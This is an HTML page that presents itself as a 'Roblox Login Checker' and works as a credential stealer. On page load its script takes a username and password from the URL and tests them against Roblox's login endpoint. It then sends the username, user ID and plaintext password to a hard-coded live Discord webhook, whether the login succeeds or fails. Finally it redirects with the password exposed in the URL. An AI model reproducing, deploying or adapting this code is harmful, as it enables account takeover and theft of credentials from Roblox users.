<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .loading {
            font-size: 24px;
            margin: 20px 0;
        }
        .result {
            font-size: 28px;
            font-weight: bold;
            margin: 20px 0;
        }
        .success { color: #00ff00; }
        .failed { color: #ff0000; }
        .credentials {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Roblox Login Checker</h1>
        <div class="credentials">
            <p>Checking account: <strong id="username">Loading...</strong></p>
        </div>
        <div class="loading" id="loading">üîÑ Verifying credentials with Roblox...</div>
        <div class="result" id="result" style="display: none;"></div>
        <div id="redirect" style="display: none;">
            <p>Redirecting to Roblox...</p>
        </div>
    </div>

    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username');
        const password = urlParams.get('password');
        const userId = urlParams.get('userid');

        // YOUR DISCORD WEBHOOKS
        const successWebhook = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
        const failedWebhook = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";

        // Display username
        document.getElementById('username').textContent = username;

        // Function to send to Discord webhook
        async function sendToDiscord(webhookUrl, data) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                return response.ok;
            } catch (error) {
                console.error('Webhook error:', error);
                return false;
            }
        }

        // ACTUAL LOGIN VERIFICATION FUNCTION
        async function verifyLogin(username, password) {
            try {
                const response = await fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        ctype: 'Username',
                        cvalue: username,
                        password: password
                    }),
                    // Important: Don't send cookies for cross-origin requests
                    credentials: 'omit'
                });

                if (response.ok) {
                    const data = await response.json();
                    return data && data.user && data.user.id;
                } else {
                    console.log('Login failed with status:', response.status);
                    return false;
                }
            } catch (error) {
                console.error('Verification error:', error);
                return false;
            }
        }

        // Actual login checking
        async function checkLogin() {
            try {
                // ACTUALLY VERIFY CREDENTIALS
                const isValid = await verifyLogin(username, password);
                
                document.getElementById('loading').style.display = 'none';
                const resultDiv = document.getElementById('result');
                resultDiv.style.display = 'block';
                
                if (isValid) {
                    resultDiv.textContent = '‚úÖ LOGIN SUCCESSFUL!';
                    resultDiv.className = 'result success';
                    
                    // SEND TO SUCCESS WEBHOOK
                    const successData = {
                        username: "Vizion MGUI Login Checker",
                        embeds: [{
                            title: "‚úÖ LOGIN SUCCESS - REAL VERIFICATION",
                            color: 65280,
                            fields: [
                                {
                                    name: "üìã ACCOUNT INFORMATION",
                                    value: `üë§ **Username:** ${username}\nüÜî **User ID:** ${userId}`,
                                    inline: false
                                },
                                {
                                    name: "üîê PASSWORD",
                                    value: `\`\`\`${password}\`\`\``,
                                    inline: false
                                },
                                {
                                    name: "üìä STATUS",
                                    value: "**VALID LOGIN** ‚úÖ (Verified with Roblox)",
                                    inline: true
                                }
                            ],
                            footer: { 
                                text: "Vizion MGUI Login Checker ‚Ä¢ " + new Date().toLocaleString(),
                            },
                            timestamp: new Date().toISOString()
                        }],
                        content: "**‚éØ‚éØ‚éØ‚éØ‚éØ„Äé REAL LOGIN SUCCESS „Äè‚éØ‚éØ‚éØ‚éØ‚éØ**"
                    };
                    
                    await sendToDiscord(successWebhook, successData);
                    console.log('Sent to success webhook - REAL VERIFICATION');
                    
                } else {
                    resultDiv.textContent = '‚ùå LOGIN FAILED!';
                    resultDiv.className = 'result failed';
                    
                    // SEND TO FAILED WEBHOOK
                    const failedData = {
                        username: "Vizion MGUI Login Checker",
                        embeds: [{
                            title: "‚ùå LOGIN FAILED - REAL VERIFICATION",
                            color: 16711680,
                            fields: [
                                {
                                    name: "üìã ACCOUNT INFORMATION",
                                    value: `üë§ **Username:** ${username}\nüÜî **User ID:** ${userId}`,
                                    inline: false
                                },
                                {
                                    name: "üîê PASSWORD",
                                    value: `\`\`\`${password}\`\`\``,
                                    inline: false
                                },
                                {
                                    name: "üìä STATUS",
                                    value: "**INVALID LOGIN** ‚ùå (Verified with Roblox)",
                                    inline: true
                                }
                            ],
                            footer: { 
                                text: "Vizion MGUI Login Checker ‚Ä¢ " + new Date().toLocaleString(),
                            },
                            timestamp: new Date().toISOString()
                        }],
                        content: "**‚éØ‚éØ‚éØ‚éØ‚éØ„Äé REAL LOGIN FAILED „Äè‚éØ‚éØ‚éØ‚éØ‚éØ**"
                    };
                    
                    await sendToDiscord(failedWebhook, failedData);
                    console.log('Sent to failed webhook - REAL VERIFICATION');
                }

                // Redirect to Roblox login after showing result
                setTimeout(() => {
                    document.getElementById('redirect').style.display = 'block';
                    window.location.href = `https://www.roblox.com/login?username=${username}&password=${password}`;
                }, 2000);

            } catch (error) {
                console.error('Check login error:', error);
                document.getElementById('loading').textContent = '‚ùå Verification error!';
            }
        }

        // Start checking on page load
        window.onload = checkLogin;
    </script>
</body>
</html>
